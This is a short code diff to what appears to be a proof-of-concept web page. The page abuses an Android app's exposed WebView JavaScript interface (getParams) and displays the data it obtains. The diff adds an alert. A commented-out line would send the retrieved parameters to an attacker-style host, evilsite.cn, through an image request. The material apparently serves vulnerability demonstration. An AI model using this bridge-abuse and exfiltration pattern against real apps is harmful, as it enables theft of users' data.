@@ -16,6 +16,7 @@
         
         function evil(){
             var result = window.JsInterface.getParams();
+            alert("hello," + result);
             document.getElementById("content").innerText = "www.evilsite.cn成功调用getParams获取到：\n"+result;
             //document.body.appendChild(document.createElement("img")).src = "https://www.evilsite.cn/abc?from_Huawei_Music="+result;
         }
